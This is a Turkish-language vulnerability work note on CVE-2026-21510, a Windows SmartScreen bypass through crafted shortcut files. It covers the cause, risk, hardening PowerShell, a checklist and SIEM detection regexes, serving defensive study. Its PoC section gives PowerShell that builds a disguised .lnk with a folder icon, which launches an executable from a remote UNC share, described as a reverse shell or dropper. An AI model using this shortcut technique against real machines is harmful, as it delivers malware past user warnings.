# TODO: CVE-2026-21510 — Windows Shell Guvenlik Ozelligi Bypass

## Meta Bilgiler
| Alan | Deger |
|------|-------|
| **Durum** | ACIK |
| **Tanimlayici** | CVE-2026-21510 |
| **Kritiklik** | Kritik |
| **Kategori Klasoru** | Isletim_Sistemi/ |
| **Kaynak Arastirma** | [Vibecoding Guvenlik Aciklari Arastirmasi (Ham Notlar).md](../Arastirmalar/Vibecoding%20G%C3%BCvenlik%20A%C3%A7%C4%B1klar%C4%B1%20Ara%C5%9Ft%C4%B1rmas%C4%B1%20(Ham%20Notlar).md) |
| **Tarih** | 2026-03-10 |
| **Mevcut Dokuman** | Henuz yok |

---

### 1. Ozet ve etki
*   **Yonetici Ozeti:** CVE-2026-21510, Windows Shell bileseninde bulunan ve Windows SmartScreen guvenlik uyarilarini tamamen bypass eden kritik bir guvenlik ozelligi atlama zafiyetidir. CVSS skoru 8.8 olan bu zafiyet, saldirganin kurbanyi kotu niyetli bir baglantiya veya kisayol dosyasina (.lnk) tiklattirarak SmartScreen tarafindan engellenmesi gereken dosyalarin uyari olmaksizin calistirilmasina olanak tanimaktadir. Microsoft Subat 2026 Patch Tuesday'de yamasi yayinlanmis olup, CISA tarafindan aktif istismar edildigi dogrulanmistir. Ozellikle vibecoding ortamlarinda otonom kodlama ajanlarinin dis kaynaklardan veri cektigi senaryolarda zincirleme risk olusturmasi nedeniyle genis bir etki alanina sahiptir.
*   **Etkilenen bilesenler:** Windows Shell (explorer.exe), Windows SmartScreen (smartscreen.exe), Mark of the Web (MOTW) dogrulama mekanizmasi, .lnk (kisayol) dosya isleyicisi, Windows 10/11 tum surumleri, Windows Server 2019/2022/2025 Desktop Experience kurulumlar

---

### 2. Teknik detay (nasil calisiyor)
*   Windows SmartScreen, internetten indirilen veya e-posta ile alinan dosyalari calistirmadan once kullaniciyi uyaran bir guvenlik mekanizmasidir. Bu mekanizma, dosyanin Mark of the Web (MOTW) Zone Identifier bilgisine dayanarak risk degerlendirmesi yapar.
*   Zafiyet, Windows Shell'in .lnk (kisayol) dosyalarini islerken SmartScreen dogrulama akisini tetiklemesindeki bir mantik hatasindan kaynaklanmaktadir. Ozel hazirlanmis bir .lnk dosyasi, hedef dosyanin MOTW isaretini tasimasia ragmen SmartScreen kontrolunu tamamen atlayabilmektedir.
*   Saldirgan, .lnk dosyasi icerisinde belirli bir hedef yolu ve komut satiri parametre kombinasyonu kullanarak Windows Shell'in SmartScreen API'sini cagirmadan dosyayi dogrudan calistirmasini saglar. Bu islem, SmartScreen uyari penceresinin hicbir zaman goruntulenmemesiyle sonuclanir.
*   Vibecoding ortamlarinda bu zafiyet ozellikle tehlikelidir: otonom kodlama ajanlari (Cursor, Claude Code vb.) dis kaynaklardan (dokumantasyon, kutuphane ornekleri) dosya cekebilmekte ve bu dosyalar arasinda .lnk dosyalari bulunabilmektedir. Ajan, SmartScreen uyarisi olmadan bu dosyalari calistirirsa zincirleme istismar gerceklesebilir.
*   **Neden:** Kok neden, Windows Shell'in .lnk dosya isleyicisindeki SmartScreen kontrol akisinda belirli dosya yolu formatlarinin (UNC yolu, kisa dosya adi — 8.3 formati) Zone Identifier kontrolunu bypass etmesidir. Shell, bu formatlarda MOTW bilgisini dogrudan okumak yerine onbellek degerine guvenir ve onbellek manipulasyonuyla kontrol atlanir.

---

### 3. Adim adim istismar (PoC — kavramsal)
> **Uyari:** Bu bolum yalnizca egitim ve savunma amaclidir.
*   **1. Hedef:** Windows 10/11 masaustu ortami — kullaniciyi .lnk dosyasini tiklattirma veya otonom ajanin dosyayi calistirmasi
*   **2. Normal durum:**
    ```
    1. Kullanici internetten bir .exe dosyasi indirir
    2. Dosyaya MOTW Zone Identifier eklenir (Zone.Identifier ADS)
    3. Kullanici dosyayi calistirmaya calistiginda SmartScreen uyari penceresi gorunur
    4. Kullanici "Yine de Calistir" tiklamadan dosya calisamaz
    ```
*   **3. Manipule edilmis durum (PoC payload):**
    ```powershell
    # Kavramsal PoC — SmartScreen bypass .lnk dosyasi olusturma

    # 1. Zararli calistirilebilir dosyayi hazirla
    # payload.exe — saldirganin reverse shell veya dropper'i

    # 2. .lnk dosyasi olustur — SmartScreen bypass icin ozel format
    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut("$env:TEMP\update.lnk")

    # 3. Hedef yolunda 8.3 kisa dosya adi formati kullan (SmartScreen bypass)
    $shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
    # /c ile baslayan argumanlarda kisa yol formati kullan
    $shortcut.Arguments = '/c start "" "\\server\share\PAYLOA~1.EXE"'

    # 4. Ikon olarak normal gorunumlu bir dosya ata (sosyal muhendislik)
    $shortcut.IconLocation = "C:\Windows\System32\shell32.dll,3"  # Klasor ikonu
    $shortcut.Description = "Sistem Guncelleme Araci"
    $shortcut.Save()

    # 5. Kurban .lnk dosyasini tikladiginda SmartScreen uyarisi GOSTERMEZ
    # payload.exe dogrudan calisir — MOTW kontrolu bypass edilmis
    ```
*   **4. Analiz:** Windows Shell, .lnk dosyasinin hedef yolunu cozumlerken 8.3 kisa dosya adi formatini (PAYLOA~1.EXE) veya UNC yolunu kullandiginda, Zone.Identifier ADS kontrolu atlanmaktadir. Shell, bu formatlarda onbellek tabanli MOTW degerlendirmesi yapar ve onbellek yanilis-negatif (false-negative) sonucu urettiginde SmartScreen API cagrisi hicbir zaman tetiklenmez. Dosya, sanki yerel ve guvenilir bir kaynaktan geliyormus gibi uyarisiz calisir.
*   **5. Kanit:** SmartScreen uyari penceresi gorunmeden zararli dosya calisir. Sysmon EventID 1 loglarinda cmd.exe > payload.exe surec zinciri gorunur. SmartScreen loglarinda (Microsoft-Windows-SmartScreen/Debug) ilgili dosya icin dogrulama kaydi bulunmaz (bypass teyidi). .lnk dosyasinin Zone.Identifier'i mevcut olmasina ragmen SmartScreen tetiklenmemistir.

---

### 4. Risk degerlendirmesi
*   **Kritiklik:** Kritik
*   **CVSS Skoru:** 8.8
*   **Saldiri Yuzeyi:** Internete acik (e-posta eki, web indirme, dosya paylasimi, USB medya; kullanici etkilesimi — tek tiklama — gerektirir)
*   **Karmasiklik:** Dusuk (ozel hazirlanmis bir .lnk dosyasi yeterli; SmartScreen bypass otomatik gerceklesir, ek teknik beceri gerekmez)

---

### 5. Kalici cozumler ve oneriler
*   **Kisa vadeli (Acil):** Microsoft Subat 2026 Patch Tuesday yamasini tum Windows sistemlerine uygulayin. SmartScreen politikasini Group Policy ile "Block" moduna alin (uyari yerine dogrudan engelle). .lnk dosyalarinin e-posta ekleri ve web indirmelerinde engellenmesi icin e-posta guvenlik cozumu (SEG) ve proxy kurallarini yapilandir. Windows Defender Application Control (WDAC) ile calistirilebilir dosya beyaz listesi uygulayin.
*   **Orta vadeli:** Attack Surface Reduction (ASR) kurallarini etkinlestirin: "Indirilen calistirilebilir iceriklerin calismasini engelle" ve "Potansiyel olarak belirsiz betiklerin calismasini engelle." Kullanici farkindalik egitimlerinde .lnk dosyalarinin riskleri vurgulayin. Otonom kodlama ajanlari (Cursor, Claude Code vb.) icin dis dosya indirme politikalarini kisitlayin ve sandbox ortaminda calistirin. Endpoint Detection and Response (EDR) cozumlerinde SmartScreen bypass davranissal tespiti etkinlestirin.
*   **Uzun vadeli:** Windows Defender Application Guard (WDAG) ile indirilen dosyalari izole sanallastirma ortaminda acin. SmartScreen mekanizmasini yalnizca MOTW'ye degil, dosya icerigi analizine (reputation + behavioral) dayali hale getirin. Kurumsal ag politikalarinda .lnk dosyalarinin dagitimini merkezi olarak kisitlayin. Vibecoding platformlari icin "guvenilmeyen dosya indirme" davranisini izleyen ajan guvenlik politikalari olusturun.

---

### 6. Ornek duzeltme kodu

**Zafiyetli kod:**
```powershell
# === GUVENSIZ: SmartScreen varsayilan ayarlar — bypass'a acik ===
# SmartScreen politikasi "Warn" modunda — bypass durumunda uyari gosterilmez
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" `
    -Name "ShellSmartScreenLevel" -ErrorAction SilentlyContinue
# Sonuc: Ayar yok veya "Warn" (bypass edilebilir)

# .lnk dosyalari icin ek kisitlama yok
# Tum kullanicilar .lnk dosyalarini serbestce calistirabilir

# ASR kurallari devre disi
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
# Sonuc: Bos veya eksik kurallar

# WDAC politikasi uygulanmamis
# Herhangi bir calistirilebilir dosya kisitiamasi yok
```

**Guvenli kod:**
```powershell
# === GUVENLI: SmartScreen bypass'a karsi sertlestirme ===

# 1. SmartScreen politikasini "Block" moduna al
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" `
    -Name "EnableSmartScreen" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" `
    -Name "ShellSmartScreenLevel" -Value "Block" -Type String
Write-Host "[+] SmartScreen 'Block' moduna alindi"

# 2. .lnk dosyalari icin ek guvenlik kisitlamalari
# Dusuk riskli dosya turlerini temizle (tum dosyalar yuksek risk)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" `
    -Name "LowRiskFileTypes" -Value "" -Type String
# .lnk dosyalarini yuksek riskli olarak isaretle
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" `
    -Name "HighRiskFileTypes" -Value ".lnk;.url;.bat;.cmd;.vbs;.js;.ws;.wsh" -Type String
Write-Host "[+] Dosya turu risk seviyeleri yapilandirildi"

# 3. ASR kurallarini etkinlestir
# Indirilen calistirilebilir iceriklerin calismasini engelle
Add-MpPreference -AttackSurfaceReductionRules_Ids be9ba2d9-53ea-4cdc-84e5-9b1eeee46550 `
    -AttackSurfaceReductionRules_Actions Enabled
# Potansiyel olarak belirsiz betiklerin calismasini engelle
Add-MpPreference -AttackSurfaceReductionRules_Ids 5beb7efe-fd9a-4556-801d-275e5ffc04cc `
    -AttackSurfaceReductionRules_Actions Enabled
Write-Host "[+] ASR kurallari etkinlestirildi"

# 4. Subat 2026 yamasini dogrula
$patch = Get-HotFix | Where-Object {
    $_.InstalledOn -gt "2026-02-01" -and $_.Description -match "Security Update"
} | Sort-Object InstalledOn -Descending
if (-not $patch) {
    Write-Warning "[!] ACIL: Subat 2026 SmartScreen yamasi bulunamadi!"
} else {
    Write-Host "[+] Guvenlik yamasi mevcut:" ($patch.HotFixID -join ", ")
}

# 5. SmartScreen bypass girisimlerini izle
$smartScreenEvents = Get-WinEvent -LogName "Microsoft-Windows-SmartScreen/Debug" `
    -MaxEvents 20 -ErrorAction SilentlyContinue
if ($smartScreenEvents) {
    Write-Host "[*] Son 20 SmartScreen olayi listelendi"
    $smartScreenEvents | Format-Table TimeCreated, Message -Wrap
}
```

---

### 7. Kontrol Listesi (Checklist)
**Hazirlik**
*   [ ] Tum Windows masaustu ve server (Desktop Experience) sistemlerini envanterle
*   [ ] Mevcut SmartScreen politikalarini (Warn/Block/Off) tum uc noktalarda kontrol et
*   [ ] .lnk dosyasi dagitim kanallarin (e-posta, web, USB) risk haritasini cikar
*   [ ] Otonom kodlama ajanlari kullanan gelistirici ortamlarini tespit et

**Duzeltme**
*   [ ] Microsoft Subat 2026 Patch Tuesday yamasini tum etkilenen sistemlere uygula
*   [ ] SmartScreen politikasini "Block" moduna al (Group Policy)
*   [ ] ASR kurallarini devreye al (indirilen dosya engeli, betik engeli)
*   [ ] E-posta ve proxy'de .lnk dosyasi engelleme kurallarini yapilandir
*   [ ] Vibecoding ajanlarinin dis dosya indirme davranisini kisitla/sandbox'ta calistir

**Dogrulama**
*   [ ] Ozel hazirlanmis .lnk dosyasiyla SmartScreen bypass testini yama sonrasi tekrarla
*   [ ] SmartScreen "Block" politikasinin dogru uygulandigini dogrula
*   [ ] ASR kurallarinin beklenen engellemeleri yaptigini test et
*   [ ] E-posta guvenlik cozumunun .lnk dosyasini engelledigini dogrula
*   [ ] CISA KEV katalogu ile uyumlulugu karsilastir

---

### 8. Izleme ve uyarilar
*   **SIEM/Log Kurallari:**
    *   Microsoft-Windows-SmartScreen/Debug loglarinda bypass belirtilerini izle (SmartScreen dogrulamasi tetiklenmemis dosya calistirma)
    *   Sysmon EventID 1 (Process Creation) — .lnk dosyasi kaynakli surec baslatmalarini izle (explorer.exe > cmd.exe/powershell.exe)
    *   Sysmon EventID 11 (File Creation) — .lnk dosyasi olusturma olaylarini izle
    *   Regex: `(?i)(\.lnk.*SmartScreen.*bypass|Zone\.Identifier.*missing|MOTW.*skip)`
    *   Regex: `(?i)(explorer\.exe.*cmd\.exe|explorer\.exe.*powershell|8\.3.*short.*name.*exec)`
    *   Windows Defender ASR olay loglarinda engellenme kayitlarini izle (EventID 1121)
*   **Anomali Tespiti:**
    *   Internetten indirilen dosyalarin SmartScreen dogrulamasi olmadan calistirilmasi
    *   .lnk dosyalarinin Temp, Downloads veya AppData klasorlerinden tetiklenmesi
    *   8.3 kisa dosya adi formati veya UNC yollari iceren .lnk dosyalarinin calistirilmasi
    *   Otonom kodlama ajanlarinin beklenmeyen .lnk veya .url dosyalari indirmesi
    *   Tek kullanicidan kisa surede birden fazla .lnk dosyasi calistirma girisimleri

---

## Notlar
Aktif istismar dogrulanmis. Microsoft Subat 2026 Patch Tuesday kapsaminda 59 zafiyet arasinda ele alinmistir. CISA tarafindan KEV kataloguna eklenmistir. Vibecoding ortamlarinda otonom kodlama ajanlarinin dis kaynaklardan indirdigi dosyalar arasinda .lnk dosyalari bulunabilir ve SmartScreen bypass nedeniyle zincirleme istismar riski olusturur. CVE-2026-21513 (MSHTML bypass) ile birlikte Subat 2026'nin en tehlikeli guvenlik ozelligi atlama zafiyetleri arasindadir.
